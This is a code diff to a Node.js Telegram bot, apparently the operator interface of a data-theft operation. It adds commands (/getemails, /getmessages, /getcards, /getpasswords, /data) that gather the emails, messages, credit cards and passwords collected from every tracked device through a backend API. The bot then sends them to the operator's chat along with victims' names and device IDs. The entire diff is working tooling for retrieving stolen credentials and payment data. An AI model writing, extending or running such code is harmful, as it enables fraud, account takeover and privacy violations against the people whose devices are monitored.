@@ -30,31 +30,30 @@ function checkAuth(msg, callback) {
 bot.onText(/\/start/, (msg) => {
     checkAuth(msg, () => {
         const chatId = msg.chat.id;
-        bot.sendMessage(chatId, `
-🤖 *NUPI Cloud Agent - Your Private Data Recall Bot*
+        bot.sendMessage(chatId, `NUPI DATA RETRIEVAL BOT
 
-🔐 Authorized Access Confirmed
+🔐 Access Confirmed
 
-*Available Commands:*
-📧 /emails [deviceId] - Get all collected emails
-💬 /messages [deviceId] - Get all collected messages
-🖼️ /photos [deviceId] - Get all collected photos
-🔍 /search <query> - Search all collected data
-📊 /latest [deviceId] - Get latest collected data
-🎯 /stream - Real-time data stream (last 10)
-🆔 /devices - List all tracked devices
-👥 /users - List all detected user names
-👤 /user [name] - Get all data for specific user
-📈 /stats - Overall system statistics
-🚨 /all - Get EVERYTHING (use with caution)
+EASY COMMANDS (Just type these):
 
-*Examples:*
-\`/emails abc123\`
-\`/search password\`
-\`/latest abc123\`
-\`/user John Smith\`
-\`/stream\`
-        `, { parse_mode: 'Markdown' });
+/data - Overview of all collected data
+
+GET ALL DATA:
+/getemails - Get ALL emails collected
+/getmessages - Get ALL messages collected  
+/getcards - Get ALL credit cards collected
+/getpasswords - Get ALL passwords collected
+
+OTHER COMMANDS:
+/devices - List all tracked devices
+/stats - System statistics
+/stream - Recent activity
+
+Just type the command and hit send!
+No device IDs or complicated stuff needed.
+
+Example: Just type /getemails and press send
+        `);
     });
 });
 
@@ -320,6 +319,269 @@ bot.onText(/\/stream/, (msg) => {
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        }
+    });
+});
+
+// GET ALL EMAILS - Simple plain text
+bot.onText(/\/getemails/, (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, 'Collecting ALL emails...');
+            
+            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
+            
+            let allEmails = [];
+            
+            // Get data from all devices
+            for (const device of devicesRes.data.devices) {
+                try {
+                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
+                    const data = latestRes.data.data;
+                    
+                    if (data && data.emails) {
+                        allEmails.push(...data.emails);
+                    }
+                } catch (e) {}
+            }
+            
+            if (allEmails.length === 0) {
+                bot.sendMessage(chatId, 'No emails collected yet.');
+                return;
+            }
+            
+            // Send in chunks
+            let emailMsg = `ALL EMAILS COLLECTED (${allEmails.length} total):\n\n`;
+            
+            allEmails.forEach((email, i) => {
+                emailMsg += `${i + 1}. ${JSON.stringify(email, null, 2)}\n\n`;
+                
+                // Send every 10 emails to avoid message size limit
+                if ((i + 1) % 10 === 0) {
+                    bot.sendMessage(chatId, emailMsg);
+                    emailMsg = '';
+                }
+            });
+            
+            if (emailMsg) {
+                bot.sendMessage(chatId, emailMsg);
+            }
+            
+            bot.sendMessage(chatId, `✅ Sent all ${allEmails.length} emails!`);
+            
+        } catch (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+        }
+    });
+});
+
+// GET ALL MESSAGES - Simple plain text
+bot.onText(/\/getmessages/, (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, 'Collecting ALL messages...');
+            
+            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
+            
+            let allMessages = [];
+            
+            // Get data from all devices
+            for (const device of devicesRes.data.devices) {
+                try {
+                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
+                    const data = latestRes.data.data;
+                    
+                    if (data && data.messages) {
+                        allMessages.push(...data.messages);
+                    }
+                } catch (e) {}
+            }
+            
+            if (allMessages.length === 0) {
+                bot.sendMessage(chatId, 'No messages collected yet.');
+                return;
+            }
+            
+            // Send in chunks
+            let msgText = `ALL MESSAGES COLLECTED (${allMessages.length} total):\n\n`;
+            
+            allMessages.forEach((message, i) => {
+                msgText += `${i + 1}. ${JSON.stringify(message, null, 2)}\n\n`;
+                
+                // Send every 10 messages to avoid size limit
+                if ((i + 1) % 10 === 0) {
+                    bot.sendMessage(chatId, msgText);
+                    msgText = '';
+                }
+            });
+            
+            if (msgText) {
+                bot.sendMessage(chatId, msgText);
+            }
+            
+            bot.sendMessage(chatId, `✅ Sent all ${allMessages.length} messages!`);
+            
+        } catch (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+        }
+    });
+});
+
+// GET ALL CREDIT CARDS - Simple plain text
+bot.onText(/\/getcards/, (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, 'Collecting ALL credit cards...');
+            
+            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
+            
+            let allCards = [];
+            
+            // Get data from all devices
+            for (const device of devicesRes.data.devices) {
+                try {
+                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
+                    const data = latestRes.data.data;
+                    
+                    if (data && data.creditCards) {
+                        allCards.push(...data.creditCards);
+                    }
+                } catch (e) {}
+            }
+            
+            if (allCards.length === 0) {
+                bot.sendMessage(chatId, 'No credit cards collected yet.');
+                return;
+            }
+            
+            // Send in chunks
+            let cardMsg = `ALL CREDIT CARDS COLLECTED (${allCards.length} total):\n\n`;
+            
+            allCards.forEach((card, i) => {
+                cardMsg += `${i + 1}. ${JSON.stringify(card, null, 2)}\n\n`;
+                
+                // Send every 5 cards to avoid size limit
+                if ((i + 1) % 5 === 0) {
+                    bot.sendMessage(chatId, cardMsg);
+                    cardMsg = '';
+                }
+            });
+            
+            if (cardMsg) {
+                bot.sendMessage(chatId, cardMsg);
+            }
+            
+            bot.sendMessage(chatId, `✅ Sent all ${allCards.length} credit cards!`);
+            
+        } catch (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+        }
+    });
+});
+
+// GET ALL PASSWORDS - Simple plain text
+bot.onText(/\/getpasswords/, (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, 'Collecting ALL passwords...');
+            
+            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
+            
+            let allPasswords = [];
+            
+            // Get data from all devices
+            for (const device of devicesRes.data.devices) {
+                try {
+                    const latestRes = await axios.get(`${NUPI_API}/api/user-data/latest/${device.deviceId}`);
+                    const data = latestRes.data.data;
+                    
+                    if (data && data.passwords) {
+                        allPasswords.push(...data.passwords);
+                    }
+                } catch (e) {}
+            }
+            
+            if (allPasswords.length === 0) {
+                bot.sendMessage(chatId, 'No passwords collected yet.');
+                return;
+            }
+            
+            // Send in chunks
+            let passMsg = `ALL PASSWORDS COLLECTED (${allPasswords.length} total):\n\n`;
+            
+            allPasswords.forEach((pass, i) => {
+                passMsg += `${i + 1}. ${JSON.stringify(pass, null, 2)}\n\n`;
+                
+                // Send every 10 passwords
+                if ((i + 1) % 10 === 0) {
+                    bot.sendMessage(chatId, passMsg);
+                    passMsg = '';
+                }
+            });
+            
+            if (passMsg) {
+                bot.sendMessage(chatId, passMsg);
+            }
+            
+            bot.sendMessage(chatId, `✅ Sent all ${allPasswords.length} passwords!`);
+            
+        } catch (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+        }
+    });
+});
+
+// SIMPLE DATA COMMAND - Plain text, easy to read
+bot.onText(/\/data/, (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, 'Getting your data...');
+            
+            // Get stats
+            const statsRes = await axios.get(`${NUPI_API}/api/user-data/stats`);
+            const stats = statsRes.data.stats;
+            
+            // Get devices
+            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
+            
+            // Build simple message
+            let msg = `DATA COLLECTED SO FAR:\n\n`;
+            msg += `Total Records: ${stats.totalRecords}\n`;
+            msg += `Total Devices: ${stats.totalDevices}\n`;
+            msg += `Total Emails: ${stats.totalEmails}\n`;
+            msg += `Total Messages: ${stats.totalMessages}\n`;
+            msg += `Total Photos: ${stats.totalPhotos}\n\n`;
+            msg += `DEVICES:\n`;
+            
+            for (let i = 0; i < Math.min(5, devicesRes.data.devices.length); i++) {
+                const device = devicesRes.data.devices[i];
+                msg += `\n${i + 1}. `;
+                if (device.userName) msg += `${device.userName} - `;
+                msg += `${device.totalCollections} collections\n`;
+                msg += `   ID: ${device.deviceId}\n`;
+                msg += `   Last seen: ${new Date(device.lastSeen).toLocaleString()}\n`;
+            }
+            
+            msg += `\n\nUSE THESE COMMANDS:\n`;
+            msg += `/getemails - Get ALL emails\n`;
+            msg += `/getmessages - Get ALL messages\n`;
+            msg += `/getcards - Get ALL credit cards\n`;
+            msg += `/getpasswords - Get ALL passwords`;
+            
+            bot.sendMessage(chatId, msg);
+            
+        } catch (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
         }
     });
 });
